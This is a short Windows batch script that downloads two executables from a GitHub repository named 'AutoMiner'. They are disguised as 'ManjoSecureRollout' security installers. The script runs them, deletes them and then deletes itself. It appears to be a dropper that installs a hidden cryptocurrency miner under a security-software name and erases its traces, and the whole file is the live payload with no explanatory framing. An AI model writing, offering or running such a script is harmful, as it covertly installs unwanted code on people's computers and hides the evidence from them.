@echo off
curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_C.exe -o ManjoSecurityInstallerC.exe
Ren "ManjoSecureRollout_C.exe_raw=true" "ManjoSecureRollout_C.exe"
curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_g.exe -o ManjoSecurityInstallerG.exe
Ren "ManjoSecureRollout_g.exe_raw=true" "ManjoSecureRollout_G.exe"
ManjoSecureRollout_C.exe
ManjoSecureRollout_G.exe
Del ManjoSecureRollout_C.exe
Del ManjoSecureRollout_G.exe
Del Script.bat
Exit

 
